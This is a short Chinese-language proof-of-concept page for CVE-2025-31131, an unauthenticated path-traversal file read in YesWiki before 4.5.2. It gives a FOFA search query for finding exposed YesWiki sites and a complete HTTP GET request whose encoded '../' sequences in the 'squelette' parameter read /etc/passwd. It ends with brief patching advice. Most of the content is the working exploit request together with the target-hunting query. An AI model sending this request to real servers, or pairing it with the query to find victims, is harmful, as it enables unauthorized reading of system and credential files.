# YesWiki 任意文件读取漏洞(CVE-2025-31131)

# 一、漏洞概述
这是一个未经身份验证的路径遍历漏洞，针对 YesWiki 4.5.2 之前的版本。该漏洞存在于允许从服务器读取任意文件的参数中。

# 二、资产测绘
FOFA: 

```plain
app="YesWiki"
```

![1747276177558-366ee01c-1e8d-470d-9cfb-8d0fb1481e86.png](/uploads/20260518/3474ee8a-063d-4c33-96b9-a43ab025294e.png)

# 三、漏洞复现
```plain
GET /?UrkCEO/edit&theme=margot&squelette=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&style=margot.css HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
```

# 四、修复建议
1、关闭互联网暴露面或接口设置访问权限

2、及时修复至4.5.2及以上版本
